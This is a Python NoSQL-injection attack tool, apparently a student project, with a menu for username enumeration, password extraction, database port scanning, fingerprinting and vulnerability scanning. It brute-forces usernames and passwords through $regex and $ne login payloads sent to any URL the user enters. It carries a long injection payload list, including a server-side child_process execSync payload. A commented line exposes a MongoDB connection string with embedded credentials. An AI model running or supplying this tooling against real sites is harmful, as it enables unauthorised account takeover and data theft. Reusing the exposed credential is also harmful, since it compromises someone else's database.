import requests
import json
import string
import re
import urllib.parse
import time
import pymongo
import socket
from urllib.parse import urlparse, parse_qs
from bson.objectid import ObjectId
from bs4 import BeautifulSoup

# Define the list of ports to scan
ports = [3306, 5432, 1433, 1521, 27017, 6379, 9042, 8091, 5984]

# Define the list of ports to scan
sqlports = [3306, 5432, 1433, 1521]

# Define the list of ports to scan
nosqlports = [27017, 6379, 9042, 8091, 5984]

# Define a dictionary to map port numbers to service names
service_names = {
    3306: "MySQL",
    5432: "PostgreSQL",
    1433: "Microsoft SQL Server",
    1521: "Oracle",
    27017: "MongoDB",
    6379: "Redis",
    9042: "Cassandra",
    8091: "Couchbase",
    5984: "CouchDB"
}

# Define a list to store service banners
service_banners = []

# Python response object properties and methods: https://www.w3schools.com/python/ref_requests_response.asp
# Send http request
def send_request(url, payload):

    # Send the modified HTTP POST request
    response = requests.post(url, json=payload)
    return response

# ================================= Username Enumeration - 1 OPTION 1 =================================
# Method to get the starting character of each username
def get_usernames_starting_char(url, usernames, charset, login_error_msg, username_json, password_json):
    print(f"========== Testing Starting Character ==========")
    # Loop through ascii character set
    for c in charset:
        # Modify the payload
        modified_payload = {username_json: {"$regex": "^" + c + ""}, password_json: {"$ne": ""}}

        print(f"Trying payload: {modified_payload}")

        # Send the modified HTTP POST request
        response = send_request(url, modified_payload)

        # Check the response
        if (not (login_error_msg in response.text)):
            # if character is valid
            print("========== Login Success ==========")
            print(f"{c} is valid")
            usernames.append(c)
    return usernames


# Method for OPTION 1, to enumerate all username based on the starting character of each username
# Need to get return value from get_usernames_starting_char() func before running this method
# Return value is passed as "usernames"
def Username_Enum(url, usernames, charset, login_error_msg, username_json, password_json):
    print(f"========== Username Enumeration ==========")
    i = 0
    j = 0
    while True:
        print(f"iteration {i}")
        # Exit loop after all usernames have been enumerated
        if (i >= len(usernames)):
            break
        # Loop through ascii character set
        for c in charset:
            j += 1
            # Modify the payload
            modified_payload = {username_json: {"$regex": "^" + usernames[i] + c + ""}, password_json: {"$ne": ""}}

            print(f"Trying payload: {modified_payload}")

            # Send the modified HTTP POST request
            response = send_request(url, modified_payload)

            # Check the response
            if (not (login_error_msg in response.text)):
                # If username is valid, break out of for loop
                j = 0
                print("========== Login Success ==========")
                usernames[i] = usernames[i] + c
                print(f"Testing username: {usernames[i]}")
                break
            else:
                # If username is invalid
                # Break out of loop once all characters in charset have been tested
                if (j >= len(charset)):
                    j = 0
                    i += 1
                    break
    return usernames


# ================================= Password Enumeration - 2 OPTION 2 CODES =================================
def Password_Enum():
    # The URL of the page to attack
    url = input("Enter the URL u want to attack:")

    # The parameter you want to attack
    username_json = input("Enter the username input parameter to attack: ")
    password_json = input("Enter the password input parameter to attack: ")

    # The character set you believe the password might contain
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!%=^[]:;"

    # The final value of the password
    extracted_value = ''

    # Ask the user for the username to target
    target_username = input("Enter the username to enumerate: ")

    # Ask the user for the response text indicating successful login
    # portswigger failed login response text:Invalid username or password
    failed_text = input("Enter the response text indicating failed login: ")

    for i in range(0, 50):  # brute force test character by character
        char_found = False
        for char in charset:
            # Construct the injection payload
            injection = '^' + extracted_value + char + '.*'

            # Construct the POST data
            data = {username_json: target_username, password_json: {'$regex': injection}}

            # Send the request to the server
            response = requests.post(url, json=data)

            if failed_text not in response.text:  # Check for successful login with target username
                extracted_value += char
                print('Found character: ' + char)
                char_found = True
                break

        if not char_found:
            break

    print('Final extracted value: ' + extracted_value)


# ================================= Database Enumeration - 3 OPTION 3 CODES =================================
def search_user_credentials(mongodb_uri, database_name, collection_name, search_query):
    # New MongoDB connection settings
    #mongodb_uri = "mongodb+srv://2200810:UbBmuEFHepv0dmuW@cluster0.6gu8jqk.mongodb.net/"

    try:
        # Initialize MongoDB client
        client = pymongo.MongoClient(mongodb_uri)

        # Select database and collection
        db = client[database_name]
        collection = db[collection_name]

        # Perform search query
        search_filter = {"$or": [
            {"_id": ObjectId(search_query)},
            {"username": search_query},
            {"password": search_query}
        ]}
        cursor = collection.find(search_filter)

        # Print search results
        print(f"Search results for query '{search_query}':")
        for document in cursor:
            for field_name, field_value in document.items():
                print(f"{field_name}: {field_value}")
            print()  # Add a blank line between documents

        # Close MongoDB client
        client.close()
    except Exception as e:
        print(f"An error occurred: {e}")

# Example usage
    if __name__ == "__main__":
        # Specify the new database name and collection name
        database_name = "IdentifyUsernamePassword"
        collection_name = "users"

        # Get user input for search query
        search_query = input("Enter search query ObjectId: ")

        # Call function to search for user credentials
        search_user_credentials(mongodb_uri, database_name, collection_name, search_query)

# ================================= Database FingerPrinting - 4 OPTION 4 CODES =================================
def check_keywords(text, keywords):
    # Check if keywords appears in the text
    found_keywords = []
    for keyword in keywords:
        if keyword.lower() in text.lower():
            found_keywords.append(keyword)
    return found_keywords


def remove_path_and_query(url):
    # Clean the URL input to remove https:// and path
    parsed_url = urlparse(url)
    return parsed_url.netloc

def replace_get_parameters(url, inject):
    # Replaces the get parameters of URL with injection string

    # Parse the URL
    parsed_url = urlparse(url)

    # Extract the query parameters
    query_params = parse_qs(parsed_url.query)

    # Replace each query parameter with the variable name
    for key in query_params:
        query_params[key] = inject

    # Reconstruct the URL with the updated query parameters
    updated_query_string = '&'.join([f"{key}={value}" for key, value in query_params.items()])
    updated_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{updated_query_string}"

    return updated_url


def scan_port(target, port):
    # Scan a Specific Port of a Given Target Server
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Set a timeout for the connection attempt
        s.settimeout(5)
        # Attempt to connect to the target IP and port
        s.connect((target, port))
        # Receive up to 1024 bytes of data from the socket
        banner = s.recv(1024).decode().strip()
        # Close the socket connection
        s.close()

        # Add the banner to the list if it's not already in the list
        if banner not in service_banners:
            service_banners.append(banner)
            # Extract Server Version in a Future Development

        # Print Port and Banner Acquired
        #print(f"Port {port} ({service_names.get(port, 'Unknown service')}): {banner}")

        if port in sqlports:
            # port is a known sql port
            print(f"Port Open Detected, Server is likely running SQL Server: {service_names.get(port, 'Unknown Service')}")
            print(f"SQL Server running, may not be running NoSQL Server")

        if port in nosqlports:
            # port is a known nosql port
            print(f"Port Open Detected, Server is likely running NoSQL Server: {service_names.get(port, 'Unknown Service')}")


    except Exception as e:
        print(f"Port {port} ({service_names.get(port, 'Unknown Service')}): {str(e)}")

def fingerprint():
    targetserver = input("Please Input Server URL (with GET Parameters; Example: http://example.com/page?param1=value1:")
    clean_url = remove_path_and_query(targetserver)

    try:
        # Port Scanning
        for port in ports:
            scan_port(clean_url, port)
    except Exception as e:
        print(f"Error: {e}")
        print(f"Continuing")

    try:
        # Attack Webpage by Injecting Payload to Generate Error
        payloadlist = [ "%27",
                        "'",
                        "‘”\/$[].>",
                        "$ne",
                        "$eq",
                        "$where",
                        "$or",
                        "' || 1==1",
                        "' || $gt 0",
                        "' || $ne 0",
                        "' || $gte 0",
                        "' || $lt 0",
                        "' || $lte 0",
                        "' || $where function() { return true; }",
                        "' || $where sleep(5000)",
                        "' || this.constructor.constructor('return process')().mainModule.require('child_process').execSync('uname -a').toString() == ''",
                        "true",
                        "$where: '1 == 1'",
                        ", $where: '1 == 1'",
                        "$where: '1 == 1'",
                        "', $where: '1 == 1'",
                        "1, $where: '1 == 1'",
                        "{ $ne: 1 }",
                        "db.injection.insert({success:1});",
                        "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
                        "|| 1==1",
                        "' && this.password.match(/.*/)//+%00",
                        "' && this.passwordzz.match(/.*/)//+%00",
                        "'%20%26%26%20this.password.match(/.*/)//+%00",
                        "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
                        "{$gt: ''}",
                        "{\"$gt\": \"\"}",
                        "[$ne]=1",
                        "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",
                        "';return 'a'=='a' && ''==''",
                        "\";return(true);var xyz='a",
                        "0;return true"
        ]

        keyword_list = []

        for payload in payloadlist:
            # Update URL with Payloads and Send to Server
            updated_url = replace_get_parameters(targetserver, payload)
            response = requests.get(updated_url)

            print(f"Trying: ", updated_url)

            # Check if Response contains SQL specific keywords
            texttocheck = str(response.content.lower())
            keywords = ["mysql", "postgres", "oracle", "mongo", "redis", "cassandra", "couchbase", "couchdb"]

            found_keywords = check_keywords(texttocheck, keywords)

            for item in found_keywords:
                if item not in keyword_list:
                    keyword_list.append(item)

            print("Keywords Detected While Injecting: ", keyword_list)

        if not keyword_list:
            # List is empty
            print(f"Unable to detect any specific Database Server")

        for keyword in keyword_list:
            # Print Likely Servers
            if keyword == "mysql":
                print(f"There is likely a MySQL Database running on the Server")
            elif keyword == "postgres":
                print(f"There is likely a PostGreSQL Database running on the Server")
            elif keyword == "oracle":
                print(f"There is likely a Oracle Database running on the Server")
            elif keyword == "mongo":
                print(f"There is likely a Mongo Database running on the Server")
            elif keyword == "redis":
                print(f"There is likely a Redis Database running on the Server")
            elif keyword == "cassandra":
                print(f"There is likely a Cassandra Database running on the Server")
            elif keyword == "couchbase":
                print(f"There is likely a Couchbase Database running on the Server")
            elif keyword == "couchdb":
                print(f"There is likely a Couchdb Database running on the Server")


    except Exception as e:
        print(f"Error: {e}")
        print(f"Continuing")


# # ================================= Vulnerability Scanning - 5 OPTION 5 CODES =================================
def Check_Param_Vulnerable():
    query_payloads = [
        "' || 1==1",
        "' || $gt 0",
        "' || $ne 0",
        "' || $gte 0",
        "' || $lt 0",
        "' || $lte 0",
        "' || $where function() { return true; }",
        "' || $where sleep(5000)",
        "' || this.constructor.constructor('return process')().mainModule.require('child_process').execSync('uname -a').toString() == ''",
        "true",
        "$where: '1 == 1'",
        ", $where: '1 == 1'",
        "$where: '1 == 1'",
        "', $where: '1 == 1'",
        "1, $where: '1 == 1'",
        "{ $ne: 1 }",
        "', $or: [ {}, { 'a':'a' } ], $comment:'successful MongoDB injection'",
        "db.injection.insert({success:1});",
        "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
        "|| 1==1",
        "' && this.password.match(/.*/)//+%00",
        "' && this.passwordzz.match(/.*/)//+%00",
        "'%20%26%26%20this.password.match(/.*/)//+%00",
        "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
        "{$gt: ''}",
        "{\"$gt\": \"\"}",
        "[$ne]=1",
        "';sleep(5000);",
        "';sleep(5000);'",
        "';sleep(5000);+'",
        "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",
        "';return 'a'=='a' && ''==''",
        "\";return(true);var xyz='a",
        "0;return true"
    ]

    def parameters():
        response = requests.get(website)
        html_content = response.text
        list_of_param = []

        # Parse HTML content using BeautifulSoup
        soup = BeautifulSoup(html_content, 'html.parser')

        # Find the form element
        form = soup.find('form')
        list_of_param = []

        if form:
            # Find all input elements within the form
            input_elements = form.find_all('input')

            # Extract parameter names
            parameter_names = [input_element.get('name') for input_element in input_elements]

            for name in parameter_names:
                list_of_param.append(name)

            return list_of_param

        else:
            print("No form found on the webpage.")

    # Function to test for NoSQL injection vulnerability, JSON format
    def testlogin_1(website, list_of_param):
        json_payloads = [
            {param[0]: {"$ne": ""}, param[1]: {"$ne": ""}},
            {param[0]: {"$ne": None}, param[1]: {"$ne": None}},
            {param[0]: {"$regex": ".*"}, param[1]: {"$regex": ".*"}},
            {param[0]: {"$ne": "foo"}, param[1]: {"$ne": "bar"}},
            {param[0]: {"$gt": None}, param[1]: {"$gt": None}},
            # Payloads for injecting to remember field
            {param[0]: {"$ne": ""}, param[1]: {"$ne": ""}, "remember": {"$ne": ""}},
            {param[0]: {"$ne": None}, param[1]: {"$ne": None}, "remember": {"$ne": None}},
            {param[0]: {"$regex": ".*"}, param[1]: {"$regex": ".*"}, "remember": {"$regex": ".*"}},
            {param[0]: {"$ne": "foo"}, param[1]: {"$ne": "bar"}, "remember": {"$ne": "baz"}},
            {param[0]: {"$gt": None}, param[1]: {"$gt": None}, "remember": {"$gt": None}}
        ]

        text = '{"' + list_of_param[0] + '","' + list_of_param[1] + '"}'
        base_response = requests.post(website, json=text)

        for payload in json_payloads:
            response = requests.post(website, json=payload)
            if response.text != base_response.text:
                print("NoSQL injection vulnerability detected for payload:", payload)
                return True

        return False

    # Function to test for NoSQL injection vulnerability, non JSON format
    def testlogin_2(url, list_of_param):
        data_payloads = [
            # Payloads for non-json requests
            {list_of_param[0] + "[$ne]": "asdf", list_of_param[1] + "[$ne]": "asdfasdf", "remember": "on"},
            {list_of_param[0] + "[$ne]": "asdf", list_of_param[1] + "[$ne]": "asdfasdf"},
        ]

        text = list_of_param[0] + "=asdf&" + list_of_param[1] + "=asdf"
        base_response = requests.post(url, data=text)

        # Send the POST request
        for payload in data_payloads:
            response = requests.post(url, data=payload)
            if response.text != base_response.text:
                print("vulnerability detected using payload: " + str(payload))
                return True
        return False

    def testquery_nosql_injection(url, payload):
        try:
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            vulnerable_parameter = list(query_params.keys())[0]  # Assuming only one parameter is present in the URL
            encoded_payload = urllib.parse.quote(payload.encode('utf-8'))
            full_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{vulnerable_parameter}={encoded_payload}"

            start_time = time.time()
            response = requests.get(full_url)
            end_time = time.time()

            # Check response for error or unexpected behavior
            if "internal server error" in response.text.lower():
                if response.status_code == 500:
                    print(
                        f"The parameter '{vulnerable_parameter}' is likely vulnerable to NoSQL injection with payload: {payload}")
            else:
                print(
                    f"The parameter '{vulnerable_parameter}' does not appear to be vulnerable with payload: {payload}")

            # Check if the response time is significantly longer
            time_difference = end_time - start_time
            if time_difference >= 5:  # Adjust the threshold as needed
                print(
                    f"The parameter '{vulnerable_parameter}' is likely vulnerable to time-based NoSQL injection with payload: {payload}")

        except requests.RequestException as e:
            print(f"Error: {e}")

    if __name__ == "__main__":
        print("[Select an option:]")
        print("==========================")
        print("Test Login forms - 1")
        print("Test URL with GET Parameters(eg. http://example.com/page?param1=value1) - 2")
        print("==========================")
        choice = input("Input option here: ")
        if choice == "1":
            website = input("Enter login form url: ")
            param = parameters()
            if testlogin_1(website, param) == False:
                if testlogin_2(website, param) == False:
                    print("No vulnerability detected")

        elif choice == "2":
            website = input("Enter URL with GET Parameters(eg. http://example.com/page?param1=value1): ")
            for payload in query_payloads:
                testquery_nosql_injection(website, payload)


def main():
    print("[Select an option:]")
    print("==========================")
    print("Username Enumeration - 1")
    print("Password Enumeration - 2")
    print("Database Enumeration - 3")
    print("Database FingerPrinting - 4")
    print("Vulnerability Scanning - 5")

    # Wait for user input and store it in a variable
    selected_option = input("Input option here: ")

    if (int(selected_option) == 1):
        # + [re.escape(c) for c in string.punctuation+string.whitespace]
        possible_char = list(string.ascii_letters) + list(string.digits)
        user_arr = []

        url = input("Enter the URL to attack: ")
        login_error_msg = input("Enter the response text indicating failed login: ")
        username_json = input("Enter the username input parameter to attack: ")
        password_json = input("Enter the password input parameter to attack: ")
        # Get the first character of each username
        user_arr = get_usernames_starting_char(url, user_arr, possible_char, login_error_msg, username_json, password_json)

        # Enumerates username based on what is returned from get_usernames_starting_char()
        user_arr = Username_Enum(url, user_arr, possible_char, login_error_msg, username_json, password_json)
        print(f"{len(user_arr)} usernames found")
        for user in user_arr:
            print(f"Username: {user}")
    elif (int(selected_option) == 2):
        Password_Enum()
    elif (int(selected_option) == 3):

        # Get MongoDB URL input from the user
        mongodb_uri = input("Enter your MongoDB URL: ")
         # Specify the new database name and collection name
        database_name = "IdentifyUsernamePassword"
        collection_name = "users"

        # Get user input for search query
        search_query = input("Enter search query ObjectId: ")

        # Call function to search for user credentials
        search_user_credentials(mongodb_uri, database_name, collection_name, search_query)
        #search_user_credentials()
    elif (int(selected_option) == 4):
        fingerprint()
    elif (int(selected_option) == 5):
        Check_Param_Vulnerable()


if __name__ == "__main__":
    main()